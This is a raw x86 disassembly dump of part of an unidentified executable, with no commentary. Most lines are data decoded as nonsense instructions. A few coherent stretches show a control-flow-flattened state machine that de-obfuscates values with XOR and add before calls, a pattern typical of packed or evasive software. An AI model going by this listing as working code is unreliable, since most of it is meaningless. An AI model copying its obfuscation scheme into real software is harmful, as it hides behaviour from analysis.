  40eaaf:	dec    ecx
  40eab0:	adc    bh,BYTE PTR [edx-0x27bd04bc]
  40eab6:	inc    ebp
  40eab7:	test   eax,0x62de28a4
  40eabc:	mov    dl,BYTE PTR [eax-0x2b6136f3]
  40eac2:	outs   dx,BYTE PTR ds:[esi]
  40eac3:	dec    edi
  40eac4:	pop    esi
  40eac5:	or     bl,0xc0
  40eac8:	jle    0x40eaee
  40eaca:	sub    dl,ah
  40eacc:	add    BYTE PTR [edx],bl
  40eace:	scas   eax,DWORD PTR es:[edi]
  40eacf:	sbb    al,0x2f
  40ead1:	fisttp DWORD PTR [ebp+0x77c26b90]
  40ead7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ead8:	xor    al,0xe5
  40eada:	inc    edx
  40eadb:	pop    ebx
  40eadc:	jnp    0x40eae2
  40eade:	sub    al,0x44
  40eae0:	dec    edx
  40eae1:	idiv   al
  40eae3:	push   ds
  40eae4:	jae    0x40eb4e
  40eae6:	inc    edx
  40eae7:	and    eax,0x9cf0eb29
  40eaec:	jmp    0x3e310fe
  40eaf1:	add    eax,0x314cd90a
  40eaf6:	mov    bh,0x83
  40eaf8:	inc    esi
  40eaf9:	leave  
  40eafa:	adc    al,0xf1
  40eafc:	dec    eax
  40eafd:	enter  0x237c,0xe8
  40eb01:	sar    BYTE PTR [esi],cl
  40eb03:	fcmove st,st(5)
  40eb05:	add    dl,cl
  40eb07:	div    BYTE PTR [eax-0x7fe3f203]
  40eb0d:	mov    bh,0x14
  40eb0f:	push   edx
  40eb10:	ds jp  0x40eaad
  40eb13:	test   al,0xc9
  40eb15:	push   ebp
  40eb16:	in     al,dx
  40eb17:	cmp    esp,DWORD PTR [eax-0x23]
  40eb1a:	pop    ebp
  40eb1b:	mov    ds:0x12bffc6a,eax
  40eb20:	fisttp WORD PTR [ecx]
  40eb22:	xchg   ebp,eax
  40eb23:	dec    edi
  40eb24:	push   0xffffffaf
  40eb26:	imul   edi,DWORD PTR [esi],0x27
  40eb29:	push   es
  40eb2a:	jge    0x40eaf0
  40eb2c:	adc    eax,0xc6a434e1
  40eb31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb32:	idiv   DWORD PTR [edx-0x7868f8f2]
  40eb38:	adc    eax,0x8a75fc52
  40eb3d:	adc    al,0x66
  40eb3f:	test   al,0xfc
  40eb41:	scas   eax,DWORD PTR es:[edi]
  40eb42:	shl    BYTE PTR [ebx],cl
  40eb44:	jne    0x40eb6c
  40eb46:	fwait
  40eb47:	aam    0x11
  40eb49:	arpl   WORD PTR [eax+0xa],sp
  40eb4c:	cmc    
  40eb4d:	push   ebx
  40eb4e:	or     al,0x6a
  40eb50:	mov    fs,WORD PTR [ebx-0xb]
  40eb53:	xor    eax,0xbe6a17d2
  40eb58:	inc    esp
  40eb59:	and    eax,0x7ff9b821
  40eb5e:	xchg   ebx,eax
  40eb5f:	mov    cl,0x31
  40eb61:	push   ecx
  40eb62:	(bad)
  40eb66:	(bad)  
  40eb67:	sub    BYTE PTR [esi+0xa1a1f4],bl
  40eb6d:	fadd   DWORD PTR [edi+0x2d]
  40eb70:	inc    esi
  40eb71:	or     eax,0x7a13409a
  40eb76:	or     BYTE PTR [eax+edi*1-0x1e6803be],ch
  40eb7d:	push   es
  40eb7e:	ja     0x40eb8e
  40eb80:	sbb    dh,BYTE PTR [edi-0x44289859]
  40eb86:	(bad)  
  40eb87:	(bad)  [esi+0x5f]
  40eb8a:	jp     0x40ebd8
  40eb8c:	mov    edi,0x91cbf183
  40eb91:	cli    
  40eb92:	ret    0x8741
  40eb95:	mov    dh,0xd1
  40eb97:	cmp    DWORD PTR [ebx],edx
  40eb99:	ret    0xae45
  40eb9c:	mov    bl,0xa7
  40eb9e:	push   ds
  40eb9f:	rcl    BYTE PTR [ecx+0x5e],cl
  40eba2:	cli    
  40eba3:	add    edx,eax
  40eba5:	fwait
  40eba6:	sub    al,ah
  40eba8:	test   eax,0x82257bff
  40ebad:	jns    0x40ec0b
  40ebaf:	popa   
  40ebb0:	push   esp
  40ebb1:	cmp    dh,BYTE PTR [eax-0x79]
  40ebb4:	pop    ebx
  40ebb5:	mov    al,ds:0xf98d5883
  40ebba:	cli    
  40ebbb:	adc    cl,BYTE PTR [esi-0x2c9e7e13]
  40ebc1:	pop    ecx
  40ebc2:	cli    
  40ebc3:	scas   al,BYTE PTR es:[edi]
  40ebc4:	mov    edx,0x9200c8ac
  40ebc9:	sbb    ecx,DWORD PTR [eax]
  40ebcb:	sahf   
  40ebcc:	dec    edi
  40ebcd:	cmp    cl,cl
  40ebcf:	mov    ecx,0xf1073c45
  40ebd4:	mul    DWORD PTR [eax]
  40ebd6:	sti    
  40ebd7:	loope  0x40ec47
  40ebd9:	popa   
  40ebda:	es push 0x6c64d455
  40ebe0:	push   ds
  40ebe1:	out    dx,al
  40ebe2:	pop    edi
  40ebe3:	sub    BYTE PTR ds:0xbe0a46fa,ch
  40ebe9:	nop
  40ebea:	jp     0x40ebd2
  40ebec:	leave  
  40ebed:	push   ebx
  40ebee:	loopne 0x40ec5e
  40ebf0:	jmp    0x40ec03
  40ebf2:	mov    DWORD PTR [ebx+ebx*2],eax
  40ebf5:	push   edi
  40ebf6:	int    0xc8
  40ebf8:	sub    edx,DWORD PTR [ecx-0x1c]
  40ebfb:	ins    DWORD PTR es:[edi],dx
  40ebfc:	int    0x6a
  40ebfe:	jae    0x40ebe9
  40ec00:	and    cl,BYTE PTR [ebx+edx*4]
  40ec03:	and    BYTE PTR [edi+edx*1],dl
  40ec06:	cmp    DWORD PTR [ebp-0x1f],0x1a72f711
  40ec0d:	mov    bh,0x8f
  40ec0f:	xchg   esp,eax
  40ec10:	xlat   BYTE PTR ds:[ebx]
  40ec11:	mov    eax,ds:0x89d4792
  40ec16:	fsubr  st,st(6)
  40ec18:	adc    BYTE PTR [esi+0x6f],ah
  40ec1b:	ret    0x864
  40ec1e:	and    dl,al
  40ec20:	xor    DWORD PTR ds:0xab9bac13,edi
  40ec26:	push   es
  40ec27:	sub    al,0x35
  40ec29:	sahf   
  40ec2a:	test   eax,0xa7e49995
  40ec2f:	aam    0xc8
  40ec31:	jle    0x40ec4c
  40ec33:	stos   DWORD PTR es:[edi],eax
  40ec34:	xlat   BYTE PTR ds:[ebx]
  40ec35:	mov    esi,0xda58c94b
  40ec3a:	leave  
  40ec3b:	mov    eax,DWORD PTR [edx-0x6b]
  40ec3e:	inc    ebx
  40ec3f:	xchg   ebp,eax
  40ec40:	jno    0x40ec14
  40ec42:	scas   al,BYTE PTR es:[edi]
  40ec43:	xchg   edi,eax
  40ec44:	out    dx,eax
  40ec45:	rcl    ebp,1
  40ec47:	loope  0x40ec9e
  40ec49:	inc    edi
  40ec4a:	jle    0x40ebd7
  40ec4c:	add    bh,al
  40ec4e:	add    eax,0x4336eb
  40ec53:	xchg   esp,eax
  40ec54:	aas    
  40ec55:	add    BYTE PTR [eax],al
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4336b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43362f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
  40ec75:	mov    DWORD PTR ds:0x433733,0x73ce
  40ec7f:	mov    DWORD PTR [ebp-0x18],eax
  40ec82:	mov    DWORD PTR ds:0x43373f,0x7077
  40ec8c:	jmp    0x40f1ad
  40ec91:	cmp    edi,0x33d
  40ec97:	jne    0x40f120
  40ec9d:	and    DWORD PTR [ebp+0x8],0x0
  40eca1:	mov    eax,DWORD PTR [ebp-0x8]
  40eca4:	sub    eax,DWORD PTR [ebp+0x8]
  40eca7:	push   eax
  40eca8:	mov    eax,DWORD PTR [ebp-0x4]
  40ecab:	add    eax,DWORD PTR [ebp+0x8]
  40ecae:	push   eax
  40ecaf:	jmp    0x40eedc
  40ecb4:	es addr16 mov esi,0x2465bf5c
  40ecbb:	gs mov dh,0x91
  40ecbe:	test   BYTE PTR [eax+ebx*4-0x606b9e],bl
  40ecc5:	mov    eax,ds:0x7c0e7e7e
  40ecca:	jle    0x40ed4a
  40eccc:	sbb    edi,DWORD PTR [ebx]
  40ecce:	enter  0x6fe4,0x94
  40ecd2:	das    
  40ecd3:	out    0xf9,eax
  40ecd5:	sub    al,0x8d
  40ecd7:	mov    ds:0x7732b390,al
  40ecdc:	les    eax,FWORD PTR [edx+0x28bd5735]
  40ece2:	es push 0x72
  40ece5:	add    eax,esp
  40ece7:	jg     0x40ecf2
  40ece9:	mov    esi,0x4042b876
  40ecee:	pushf  
  40ecef:	inc    esp
  40ecf0:	(bad)  
  40ecf2:	pop    eax
  40ecf3:	jge    0x40ed22
  40ecf5:	dec    esp
  40ecf6:	jmp    0xfc7f:0x2db28c8c
  40ecfd:	fs fwait
  40ecff:	xchg   ebx,eax
  40ed00:	pop    ebx
  40ed01:	popaw  
  40ed03:	mov    dh,bh
  40ed05:	inc    eax
  40ed06:	jo     0x40ece4
  40ed08:	lea    esp,[ebx+0x4ad95ba4]
  40ed0e:	adc    DWORD PTR [esi-0x1f],esi
  40ed11:	sbb    BYTE PTR [esp+edx*2],0xdd
  40ed15:	mov    ch,0x3e
  40ed17:	vmread DWORD PTR ds:0xcfc32676,ebp
  40ed1e:	jb     0x40ecee
  40ed20:	stos   BYTE PTR es:[edi],al
  40ed21:	pop    ebx
  40ed22:	and    dl,BYTE PTR [edi]
  40ed24:	cwde   
  40ed25:	cmp    ch,BYTE PTR ds:0xbf71a702
  40ed2b:	ss mov ah,0xa1
  40ed2e:	mov    edx,DWORD PTR [ebp-0x23]
  40ed31:	adc    edi,esp
  40ed33:	jno    0x40ecd7
  40ed35:	mov    cl,BYTE PTR [esi-0x2f8a9f9e]
  40ed3b:	dec    ebx
  40ed3c:	mov    ebx,DWORD PTR [ebp+0x2c]
  40ed3f:	inc    esi
  40ed40:	pop    ds
  40ed41:	or     eax,0x8cdef400
  40ed46:	jb     0x40ed15
  40ed48:	and    edi,edx
  40ed4a:	jno    0x40edaa
  40ed4c:	fistp  QWORD PTR [eax-0x2a]
  40ed4f:	sub    eax,0x607c540d
  40ed54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed55:	dec    edx
  40ed56:	enter  0x13fc,0xc3
  40ed5a:	pop    ds
  40ed5b:	sbb    bl,BYTE PTR [ebx+0x5a]
  40ed5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed5f:	push   es
  40ed60:	add    eax,0xb05d55d1
  40ed65:	and    DWORD PTR ss:[ecx],esp
  40ed68:	cmp    BYTE PTR [esi],ch
  40ed6a:	mov    bh,0xe2
  40ed6c:	(bad)  
  40ed6e:	sub    ebx,DWORD PTR [edi]
  40ed70:	das    
  40ed71:	jl     0x40ed34
  40ed73:	imul   esi,DWORD PTR [edx+0x6db12d5a],0x47704c4a
  40ed7d:	pop    ds
  40ed7e:	adc    eax,DWORD PTR [ebp+0x62f0d165]
  40ed84:	(bad)  
  40ed86:	retf   
  40ed87:	fimul  DWORD PTR [eax+ecx*8]
  40ed8a:	clc    
  40ed8b:	adc    al,0xf2
  40ed8d:	call   0x76c1:0x6d1ab8c4
  40ed94:	inc    esp
  40ed95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed96:	xchg   edi,eax
  40ed97:	fsub   DWORD PTR [edx]
  40ed99:	xchg   ebp,eax
  40ed9a:	int    0x5
  40ed9c:	test   al,0x18
  40ed9e:	std    
  40ed9f:	cmp    al,0x45
  40eda1:	pop    esp
  40eda2:	test   eax,0xa8f87b4d
  40eda7:	call   0xfc59:0x1ffad96b
  40edae:	xor    ebp,DWORD PTR [esi-0x687e7dc3]
  40edb4:	mov    ds:0x3a958ae6,al
  40edb9:	jnp    0x40ee20
  40edbb:	dec    edi
  40edbc:	xor    DWORD PTR [eax],esp
  40edbe:	fcomp  st(1)
  40edc0:	push   ecx
  40edc1:	add    DWORD PTR [eax+0x48a7e10d],esp
  40edc7:	push   ebx
  40edc8:	jge    0x40ed93
  40edca:	push   esp
  40edcb:	test   BYTE PTR [eax-0x1c],cl
  40edce:	(bad)  
  40edcf:	lock jg 0x40ee0b
  40edd2:	jle    0x40eda5
  40edd4:	xor    eax,0x648250ca
  40edd9:	sub    ecx,ebx
  40eddb:	jecxz  0x40ed7c
  40eddd:	adc    BYTE PTR [edi+0x5e],ah
  40ede0:	push   0xd
  40ede2:	xor    ah,BYTE PTR [edx+eiz*4+0x2e]
  40ede6:	std    
  40ede7:	push   esi
  40ede8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ede9:	jmp    0x434c:0xab1d6192
  40edf0:	in     al,dx
  40edf1:	mov    ah,0x29
  40edf3:	inc    edi
  40edf4:	xor    BYTE PTR [ebp-0x53],0x7c
  40edf8:	push   cs
  40edf9:	dec    ebp
  40edfa:	retf   0xe76a
  40edfd:	sub    eax,0x76a2dbe3
  40ee02:	daa    
  40ee03:	out    dx,eax
  40ee04:	push   ds
  40ee05:	sbb    eax,0x1bb33cff
  40ee0a:	mov    bh,0xda
  40ee0c:	out    0x7e,eax
  40ee0e:	mov    edx,0x88c4d96b
  40ee13:	imul   edi,DWORD PTR [esi],0x5c0e100b
  40ee19:	and    eax,0x895d8162
  40ee1e:	faddp  st(4),st
  40ee20:	out    0xed,al
  40ee22:	repnz arpl WORD PTR [edx+0x497a28aa],ax
  40ee29:	dec    esi
  40ee2a:	test   DWORD PTR [edi+0x4f],0xe1d70f7e
  40ee31:	sub    ebp,ecx
  40ee33:	xchg   esi,eax
  40ee34:	div    DWORD PTR [edi+0x5c02dc22]
  40ee3a:	shr    bl,0xda
  40ee3d:	jo     0x40ee07
  40ee3f:	test   BYTE PTR [ebx],bl
  40ee41:	dec    esp
  40ee42:	pop    ss
  40ee43:	and    ch,BYTE PTR [ebx-0xd]
  40ee46:	adc    cl,BYTE PTR [ebx-0x7dc74e41]
  40ee4c:	adc    eax,0x80c30c57
  40ee51:	jmp    0x40eebd
  40ee53:	loope  0x40ee9c
  40ee55:	les    ecx,FWORD PTR [esi-0x30]
  40ee58:	std    
  40ee59:	(bad)  
  40ee5a:	icebp  
  40ee5b:	xchg   esp,eax
  40ee5c:	cs into 
  40ee5e:	bound  ecx,QWORD PTR [edx-0x2748729c]
  40ee64:	push   ecx
  40ee65:	jmp    0x40eee1
  40ee67:	cmp    dh,BYTE PTR [ebp+0x37d4bd13]
  40ee6d:	ins    DWORD PTR es:[edi],dx
  40ee6e:	add    BYTE PTR [ebp+0x5e1a70c0],ah
  40ee74:	jl     0x40ee76
  40ee76:	cdq    
  40ee77:	std    
  40ee78:	rcl    BYTE PTR [ecx-0x19],cl
  40ee7b:	fisub  WORD PTR [ebx-0x125ac053]
  40ee81:	loopne 0x40ee3f
  40ee83:	(bad)  
  40ee84:	(bad)  
  40ee85:	pusha  
  40ee86:	lock cld 
  40ee88:	imul   DWORD PTR [edx]
  40ee8a:	daa    
  40ee8b:	ins    DWORD PTR es:[edi],dx
  40ee8c:	scas   eax,DWORD PTR es:[edi]
  40ee8d:	jg     0x40ee9c
  40ee8f:	sbb    edi,DWORD PTR ds:0xcdac4d12
  40ee95:	mov    esi,0xb6945621
  40ee9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee9b:	push   esi
  40ee9c:	pop    es
  40ee9d:	and    eax,0x15307db
  40eea2:	mov    ah,0x33
  40eea4:	sbb    ecx,DWORD PTR [ebx-0x5c75545b]
  40eeaa:	test   esp,ecx
  40eeac:	(bad)
  40eeaf:	cmp    edi,esi
  40eeb1:	ret    
  40eeb2:	lods   al,BYTE PTR ds:[esi]
  40eeb3:	xor    BYTE PTR [eax+0x21],ah
  40eeb6:	ja     0x40eec2
  40eeb8:	fsub   st,st(0)
  40eeba:	pop    ds
  40eebb:	jae    0x40ee7f
  40eebd:	push   ds
  40eebe:	or     DWORD PTR [esi],ebp
  40eec0:	xchg   ebx,eax
  40eec1:	dec    eax
  40eec2:	and    BYTE PTR [ecx-0x35c2df19],0x82
  40eec9:	adc    DWORD PTR [edx+0x3f95d1b6],0xc7dd2b35
  40eed3:	clc    
  40eed4:	sbb    eax,0xd35e2ffd
  40eed9:	jne    0x40ef2e
  40eedb:	sub    eax,0xff5b9de8
  40eee0:	(bad)  
  40eee1:	inc    DWORD PTR [ebp+0x8]
  40eee4:	cmp    DWORD PTR [ebp+0x8],0x52
  40eee8:	jb     0x40eca1
  40eeee:	jmp    0x40f1ad
  40eef3:	jmp    0x40f120
  40eef8:	lds    ebp,FWORD PTR [edx+0x1371069f]
  40eefe:	imul   ecx,DWORD PTR gs:[ebx-0x126710ba],0x8fbe51b0
  40ef09:	scas   eax,DWORD PTR es:[edi]
  40ef0a:	jle    0x40ef8a
  40ef0c:	push   cs
  40ef0d:	jl     0x40ef8d
  40ef0f:	jle    0x40eeb3
  40ef11:	xlat   BYTE PTR ds:[ebx]
  40ef12:	cmp    al,0x5d
  40ef14:	pop    esi
  40ef15:	hlt    
  40ef16:	xor    dh,BYTE PTR [ebx*2+0x44be5113]
  40ef1d:	push   cs
  40ef1e:	jmp    0xe07443a0
  40ef23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef24:	cmp    al,BYTE PTR [eax+esi*8]
  40ef27:	sub    eax,0x497b2e5
  40ef2c:	xor    ecx,DWORD PTR [ecx]
  40ef2e:	cdq    
  40ef2f:	ja     0x40eefb
  40ef31:	les    edi,FWORD PTR [edi-0x5ff6f680]
  40ef37:	xor    al,0xc6
  40ef39:	sub    edi,DWORD PTR [esi+eiz*8-0x2dfc7c19]
  40ef40:	pop    ds
  40ef41:	mov    ah,0x7
  40ef43:	fsub   QWORD PTR [ebp+edi*8+0xa]
  40ef47:	mov    ds:0x8083d241,eax
  40ef4c:	and    bh,BYTE PTR [eax+0xded109f]
  40ef52:	mov    al,0x8
  40ef54:	aad    0x41
  40ef56:	adc    ah,BYTE PTR [eax+0x4a]
  40ef59:	ins    DWORD PTR es:[edi],dx
  40ef5a:	xchg   ecx,eax
  40ef5b:	les    ebp,FWORD PTR ds:0xe46d3286
  40ef61:	movaps xmm5,XMMWORD PTR [ebx]
  40ef64:	sbb    ch,BYTE PTR [eax-0x198f12eb]
  40ef6a:	add    al,0xf7
  40ef6c:	mov    edi,esp
  40ef6e:	jbe    0x40ef99
  40ef70:	shl    DWORD PTR [eax-0x4f9e9e32],cl
  40ef76:	icebp  
  40ef77:	ins    DWORD PTR es:[edi],dx
  40ef78:	cmp    BYTE PTR [eax],cl
  40ef7a:	cmc    
  40ef7b:	imul   eax,DWORD PTR [eax+ebx*2+0x4b774008],0x32
  40ef83:	push   eax
  40ef84:	arpl   WORD PTR [ebx+0x23],sp
  40ef87:	dec    edx
  40ef88:	cwde   
  40ef89:	jae    0x40ef4e
  40ef8b:	fild   QWORD PTR [eax+0x1f]
  40ef8e:	cmp    BYTE PTR [ebx+0x4ded108e],bl
  40ef94:	in     eax,0x16
  40ef96:	mov    ds,edi
  40ef98:	sbb    eax,0x802487fb
  40ef9d:	int    0x26
  40ef9f:	(bad)  
  40efa0:	mov    esi,0x455fdd2a
  40efa5:	pop    esi
  40efa6:	aam    0xf7
  40efa8:	fnstenv [edi+esi*8-0x58]
  40efac:	push   ebp
  40efad:	jg     0x40efef
  40efaf:	add    DWORD PTR [ebx+0x56faf572],edi
  40efb5:	cli    
  40efb6:	xlat   BYTE PTR ds:[ebx]
  40efb7:	mov    ebp,0xcd7b972a
  40efbc:	out    0xd,eax
  40efbe:	fld    TBYTE PTR [ebx]
  40efc0:	pushf  
  40efc1:	hlt    
  40efc2:	inc    ebp
  40efc3:	aaa    
  40efc4:	inc    ebp
  40efc5:	mov    edi,0x8cb7431b
  40efca:	mov    ds:0x4bb94419,al
  40efcf:	xchg   edx,eax
  40efd0:	fild   DWORD PTR [edi]
  40efd2:	pop    eax
  40efd3:	daa    
  40efd4:	jns    0x40f01b
  40efd6:	pop    esi
  40efd7:	sub    eax,0x838ed24d
  40efdc:	jle    0x40f034
  40efde:	push   ds
  40efdf:	xor    al,0xbd
  40efe1:	and    dl,dh
  40efe3:	out    dx,al
  40efe4:	mov    ds,ebp
  40efe6:	push   es
  40efe7:	pop    ds
  40efe8:	cmp    BYTE PTR [ebp+0x7b],al
  40efeb:	cli    
  40efec:	pop    edx
  40efed:	in     al,0x2b
  40efef:	inc    eax
  40eff0:	cmp    edx,DWORD PTR [edi]
  40eff2:	mov    ebp,DWORD PTR [edx]
  40eff4:	iret   
  40eff5:	xor    BYTE PTR [eax+0x47],bl
  40eff8:	jp     0x40ef85
  40effa:	mov    ds:0x4e09865,al
  40efff:	xor    bl,BYTE PTR [edi]
  40f001:	jne    0x40f05e
  40f003:	fnstenv [ebp-0x15c0ff11]
  40f009:	gs inc esp
  40f00b:	lods   eax,DWORD PTR ds:[esi]
  40f00c:	jecxz  0x40f03a
  40f00e:	adc    BYTE PTR [esi+0x664ad985],al
  40f014:	aas    
  40f015:	fstp   st(5)
  40f017:	ins    BYTE PTR es:[edi],dx
  40f018:	mov    edx,0x9a58bde2
  40f01d:	jbe    0x40f07b
  40f01f:	xlat   BYTE PTR ds:[ebx]
  40f020:	fdivr  QWORD PTR [ebp-0x6c]
  40f023:	adc    bl,cl
  40f025:	inc    ecx
  40f026:	pusha  
  40f027:	xor    cl,BYTE PTR [eax+0x1e972ad3]
  40f02d:	les    edi,FWORD PTR [edi]
  40f02f:	ds push esi
  40f031:	mov    al,0xa9
  40f033:	push   cs
  40f034:	call   0xc926a24e
  40f039:	push   0x5a
  40f03b:	iret   
  40f03c:	and    al,ah
  40f03e:	clc    
  40f03f:	xchg   edi,eax
  40f040:	and    ebx,esp
  40f042:	popa   
  40f043:	stos   DWORD PTR es:[edi],eax
  40f044:	faddp  st(6),st
  40f046:	mov    ds:0x3c50ca5b,eax
  40f04b:	es nop
  40f04d:	add    BYTE PTR [edi],dl
  40f04f:	and    BYTE PTR [esp+esi*8+0x2c],0x9f
  40f054:	retf   0xd12d
  40f057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f058:	fistp  DWORD PTR [eax+0x7d]
  40f05b:	jp     0x40efff
  40f05d:	imul   ebx,edi,0xb3c5bdd9
  40f063:	(bad)  
  40f064:	xor    al,0x1f
  40f066:	push   eax
  40f067:	lea    ebp,[ebp*4+0x7911ebc1]
  40f06e:	jae    0x40f066
  40f070:	(bad)  [edi+eiz*8]
  40f073:	out    0xd0,al
  40f075:	dec    esi
  40f076:	int    0x7d
  40f078:	jb     0x40f02e
  40f07a:	pop    es
  40f07b:	das    
  40f07c:	mov    al,ds:0x44511750
  40f081:	leave  
  40f082:	mov    eax,0x258db37d
  40f087:	mov    ebx,0xe4e8fd8
  40f08c:	fwait
  40f08d:	mov    esp,0x47f32536
  40f092:	push   ss
  40f093:	push   ss
  40f094:	dec    edi
  40f095:	imul   edi,DWORD PTR ds:0xdc10e87f,0x5e
  40f09c:	bound  ecx,QWORD PTR [ecx-0x283b7beb]
  40f0a2:	cmp    cl,ch
  40f0a4:	hlt    
  40f0a5:	cmp    DWORD PTR [edi-0x5d],0xffffffda
  40f0a9:	mov    eax,ds:0x3070ea31
  40f0ae:	cmp    eax,0xaa53cd1f
  40f0b3:	or     edx,DWORD PTR [eax-0x1ca89e6e]
  40f0b9:	mov    dl,0xa3
  40f0bb:	div    ecx
  40f0bd:	fcom   DWORD PTR [ecx-0x44]
  40f0c0:	bound  eax,QWORD PTR [eax-0xcd4d2b0]
  40f0c6:	ja     0x40f147
  40f0c8:	mov    ds:0x2e5051e4,al
  40f0cd:	or     esi,DWORD PTR [edx]
  40f0cf:	pop    ecx
  40f0d0:	cld    
  40f0d1:	xor    BYTE PTR [eax-0x68c4b08f],0x2e
  40f0d8:	pop    ss
  40f0d9:	adc    eax,0x65e664a3
  40f0de:	sub    ch,BYTE PTR [ebx+0x6036a37b]
  40f0e4:	jg     0x40f13e
  40f0e6:	pop    eax
  40f0e7:	lahf   
  40f0e8:	shr    DWORD PTR [ecx+ecx*8-0x40],cl
  40f0ec:	push   ds
  40f0ed:	mov    cl,0x88
  40f0ef:	or     DWORD PTR [eax+0x3],0x4f
  40f0f3:	enter  0x487b,0xfb
  40f0f7:	inc    esp
  40f0f8:	mov    esp,0x42d484c
  40f0fd:	fisubr WORD PTR [esi]
  40f0ff:	je     0x40f180
  40f101:	(bad)  
  40f102:	mov    eax,ds:0xe1f025f7
  40f107:	mov    cl,0x48
  40f109:	pushf  
  40f10a:	cli    
  40f10b:	sub    eax,0x63b8dcc1
  40f110:	pop    eax
  40f111:	mov    WORD PTR [esp+edx*4-0x16],?
  40f115:	mov    BYTE PTR [ebp-0x194b912c],ah
  40f11b:	jnp    0x40f149
  40f11d:	adc    ebx,DWORD PTR [edi-0xd]
  40f120:	cmp    edi,0x1a3
  40f126:	jne    0x40f17b
  40f12c:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40f133:	mov    eax,DWORD PTR [ebp-0x4]
  40f136:	mov    DWORD PTR [ebp-0x5c],eax
  40f139:	mov    eax,DWORD PTR [ebp-0x8]
  40f13c:	mov    DWORD PTR [ebp-0x58],eax
  40f13f:	mov    eax,DWORD PTR [ebp-0xc]
  40f142:	xor    eax,esi
  40f144:	add    eax,ebx
  40f146:	mov    DWORD PTR [ebp-0x54],eax
  40f149:	lea    eax,[ebp-0x1c]
  40f14c:	mov    DWORD PTR [ebp-0x50],eax
  40f14f:	mov    eax,DWORD PTR [ebp-0x60]
  40f152:	xor    eax,esi
  40f154:	add    eax,ebx
  40f156:	mov    DWORD PTR [ebp-0x60],eax
  40f159:	lea    eax,[ebp-0x60]
  40f15c:	push   eax
  40f15d:	mov    eax,DWORD PTR [ebp+0xc]
  40f160:	xor    eax,esi
  40f162:	add    eax,ebx
  40f164:	push   eax
  40f165:	mov    eax,ds:0x413bfe
  40f16a:	push   0x413b54
  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx-0xc36d1cf]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f1f7
  40f1e9:	aam    0xae
  40f1eb:	xchg   esp,eax
  40f1ec:	fisubr WORD PTR [esi+edx*1]
  40f1ef:	and    al,0xe0
  40f1f1:	pop    edi
  40f1f2:	or     DWORD PTR [esi+0x47460b9b],0xfffffff9
  40f1f9:	sbb    al,0xe4
  40f1fb:	xchg   ebp,eax
  40f1fc:	xchg   esp,eax
  40f1fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1fe:	pushf  
  40f1ff:	outs   dx,BYTE PTR ds:[esi]
  40f200:	jmp    0x40f1a2
  40f202:	xor    esp,ecx
  40f204:	out    dx,al
  40f205:	xchg   ecx,eax
  40f206:	xor    cl,BYTE PTR [esi+0x64db642d]
  40f20c:	pop    edi
  40f20d:	sub    eax,0xf38983f3
  40f212:	xor    edx,ecx
  40f214:	nop
  40f215:	sbb    eax,0xfdc59e89
  40f21a:	push   ss
  40f21b:	xchg   esi,eax
  40f21c:	mov    esi,0x1b174bfd
  40f221:	xchg   ebx,eax
  40f222:	sub    al,0xb6
  40f224:	test   eax,0xc8152508
  40f229:	mov    ah,0xa2
  40f22b:	add    ebx,edi
  40f22d:	(bad)
  40f232:	rcl    BYTE PTR [eax+edi*1-0x5acb8d48],1
  40f239:	fistp  QWORD PTR [ecx+0x794715b8]
  40f23f:	dec    esp
  40f240:	inc    eax
  40f241:	xchg   ebp,eax
  40f242:	xor    eax,0xc987fc09
  40f247:	push   eax
  40f248:	hlt    
  40f249:	inc    ebx
  40f24a:	push   esp
  40f24b:	add    DWORD PTR [ecx+ebx*2+0x7317f983],ebx
  40f252:	xchg   esi,eax
  40f253:	loopne 0x40f235
  40f255:	pop    edi
  40f256:	jb     0x40f1f3
  40f258:	nop
  40f259:	lods   eax,DWORD PTR ds:[esi]
  40f25a:	xchg   BYTE PTR [ebx+0x4df74eb9],ah
  40f260:	lock clc 
  40f262:	ror    DWORD PTR [ebp-0x1],cl
  40f265:	dec    edi
  40f266:	aas    
  40f267:	out    dx,eax
  40f268:	inc    edx
  40f269:	call   0x3bdc98b8
